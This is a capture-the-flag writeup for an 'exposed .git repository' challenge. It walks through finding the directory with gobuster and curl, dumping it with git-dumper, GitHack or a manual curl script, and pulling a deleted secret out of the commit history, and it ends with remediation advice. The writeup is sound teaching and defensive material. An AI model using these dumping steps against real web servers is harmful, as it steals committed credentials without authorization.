# Git Challenge Writeup — Exposed Repository

**Category:** Misconfiguration / OSINT
**Difficulty:** Easy
**Flag:** `CTF{exposed_git_repository_secret}`
**Responsible:** Svenja

---

## Overview

The CorpChat web server serves a directory at `/challenge/` that contains a fully intact `.git` directory. When a `.git` folder is accessible over HTTP, an attacker can reconstruct the entire repository history — including any secrets that were ever committed, even if they were later deleted. This is one of the most common real-world misconfigurations found in production web applications.

---

## Background: Why This Happens

Developers sometimes deploy web applications by copying the project directory directly to the server without excluding `.git/`. Flask's static file serving makes this trivially exploitable: if you tell Flask to serve a directory, it serves everything in it, including hidden dot-directories.

In this challenge, `app.py` registers a static route that serves the `/static/` directory. The path `/static/challenge/` contains both a fake project tree and the `.git` object store. Flask's `send_from_directory` has no concept of "don't serve hidden folders", so `.git/` is fully browseable over HTTP.

### What's inside `.git/`

A git repository is just files and directories. The key ones are:

| Path | Contains |
|------|---------|
| `.git/HEAD` | Current branch reference (`ref: refs/heads/main`) |
| `.git/refs/heads/main` | SHA1 hash of the latest commit |
| `.git/objects/` | All git objects (commits, trees, blobs) stored as zlib-compressed files |
| `.git/config` | Repository configuration |
| `.git/COMMIT_EDITMSG` | Last commit message |

Because git objects are content-addressed by SHA1, if you know the hash of the HEAD commit you can walk the entire history by fetching objects one by one.

---

## Step 1 — Discover the Exposed Directory

### Manual

Browse to:

```
http://<ip>:8080/challenge/
```

You will see a directory listing. Look for `.git/` in the listing. Click into it — you'll see the standard git directory structure: `HEAD`, `config`, `objects/`, `refs/`.

Confirm the HEAD ref:

```bash
curl -s http://<ip>:8080/challenge/.git/HEAD
# ref: refs/heads/main
```

### Via Directory Brute Force

If you're running automated recon:

```bash
gobuster dir \
  -u http://<ip>:8080/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x '' \
  --no-error

# Or with feroxbuster:
feroxbuster -u http://<ip>:8080/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

`.git` will appear in the results. Always check for `.git/HEAD` as a quick confirmation:

```bash
curl -si http://<ip>:8080/.git/HEAD      # root — 404 here
curl -si http://<ip>:8080/challenge/.git/HEAD  # found
```

---

## Step 2 — Confirm Full Repository Access

Before spending time on a dump, verify a few key files are accessible:

```bash
BASE="http://<ip>:8080/challenge/.git"

# Is HEAD readable?
curl -s "$BASE/HEAD"
# ref: refs/heads/main

# Get the SHA1 of the tip commit
curl -s "$BASE/refs/heads/main"
# e.g.: 3f9a2b1c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a

# Try fetching a packed-refs file (exists if the repo has many refs)
curl -si "$BASE/packed-refs"
```

If all of these return data rather than 404, the repository is fully accessible.

---

## Step 3 — Dump the Repository

### Option A — git-dumper (Recommended)

`git-dumper` automates the full reconstruction. It fetches the index file, all reachable objects, and reassembles the working tree.

```bash
pip install git-dumper

git-dumper http://<ip>:8080/challenge/.git/ ./leaked-repo

ls -la leaked-repo/
# You now have the full project tree
```

`git-dumper` works by:
1. Fetching `.git/HEAD` and `.git/config`.
2. Attempting `.git/info/packs` and `.git/objects/info/packs` for pack files.
3. Fetching `.git/packed-refs` and all loose refs under `.git/refs/`.
4. Walking every commit → tree → blob chain, downloading each object individually.
5. Checking out the files using the downloaded index.

### Option B — gittools / GitHack

```bash
# GitHack (Python 2 compatible)
python GitHack.py http://<ip>:8080/challenge/.git/

# Or use the rip-git.pl script from dvcs-ripper
perl rip-git.pl -v -u http://<ip>:8080/challenge/.git/
```

### Option C — Manual (Understanding the Format)

This teaches you how git objects work:

```bash
mkdir -p stolen/.git
cd stolen

# Step 1: get HEAD
curl -s http://<ip>:8080/challenge/.git/HEAD > .git/HEAD
cat .git/HEAD
# ref: refs/heads/main

# Step 2: get the tip commit hash
curl -s http://<ip>:8080/challenge/.git/refs/heads/main > .git/refs/heads/main
COMMIT=$(cat .git/refs/heads/main)
echo "Tip commit: $COMMIT"

# Step 3: fetch the commit object
# Git stores objects at objects/<first 2 chars>/<remaining 38 chars>
PREFIX="${COMMIT:0:2}"
REST="${COMMIT:2}"
mkdir -p ".git/objects/$PREFIX"
curl -s "http://<ip>:8080/challenge/.git/objects/$PREFIX/$REST" \
     -o ".git/objects/$PREFIX/$REST"

# Step 4: read the commit with git
git init
git cat-file -t $COMMIT   # → commit
git cat-file -p $COMMIT   # shows: tree, parent, author, committer, message
```

The commit object reveals the tree hash and parent commit hashes. Repeat for each, downloading blob objects as you go. This is tedious but educational.

---

## Step 4 — Read the Full History

```bash
cd leaked-repo

# Short log
git log --oneline
# Example output:
# 7e3a9f2 Remove sensitive config file
# 4b8c1d0 Add CI pipeline
# 1a2b3c4 Initial commit with project setup

# Full diff of every commit
git log -p --all

# Or just search history for anything that looks like a flag
git log -p --all | grep -A5 -B5 'CTF{'
```

The key commit to look for is one with a message like **"Remove sensitive config file"** or similar. The secret was committed and then removed — but git never forgets.

```bash
# Show a specific commit
git show 1a2b3c4

# List files that existed in a historical commit
git ls-tree 1a2b3c4

# Extract a specific file from a historical commit
git show 1a2b3c4:config.env
```

---

## Step 5 — Extract the Flag

In one of the earlier commits you will find a file containing:

```
SECRET_KEY=CTF{exposed_git_repository_secret}
```

This was committed and then removed, but the original blob is still reachable through the commit history.

**Flag: `CTF{exposed_git_repository_secret}`**

---

## How the Challenge Repository Was Built

The fake git repository is created by `ctfrepo.sh` — a Python script that manually constructs git objects without ever calling `git init`. This approach produces a valid git repository whose history is entirely under our control.

The script works by:

1. **Creating blob objects**: A git blob is `"blob <size>\0<content>"`, compressed with zlib, stored at `.git/objects/<sha1[:2]>/<sha1[2:]>`.

2. **Creating tree objects**: A tree lists directory entries as `"<mode> <name>\0<20-byte sha1>"` (binary SHA1), one per file.

3. **Creating commit objects**: A commit is a text object containing `tree <hash>`, optional `parent <hash>`, `author`, `committer`, and message fields.

4. **Setting the HEAD ref**: Writing the tip commit's SHA1 to `.git/refs/heads/main`.

The result is a fully valid git repository. Running `git log` on the dumped repo produces real history with the secret embedded in an early commit.

---

## Common Mistakes and Troubleshooting

| Problem | Cause | Fix |
|---------|-------|-----|
| `git-dumper` hangs | Rate limiting or connection issues | Use `--jobs 1` flag |
| Objects missing after dump | Pack files not fetched | Try `git fetch` inside the repo after git-dumper completes |
| `git log` shows no history | Only HEAD commit fetched | Ensure `parent` commits were also downloaded |
| 403 on object files | Server configured to block `.git` (in real CTFs) | Use directory traversal or alternate paths |

---

## Remediation (Real World)

- **Web server rules**: Add a `Location /.git { deny all; }` block (nginx) or `<Location "/.git"> Require all denied </Location>` (Apache).
- **Deploy from archives**: Instead of copying the full project directory, build and deploy a clean archive (`git archive`) that excludes `.git/`.
- **Pre-commit hooks**: Use `git-secrets` or similar tools to prevent committing credentials.
- **Secret scanning**: Tools like `trufflehog` or `gitleaks` scan git history for secrets retrospectively.
- **Rotate committed secrets**: Any credential that was ever committed — even if later deleted — must be considered compromised and rotated immediately.
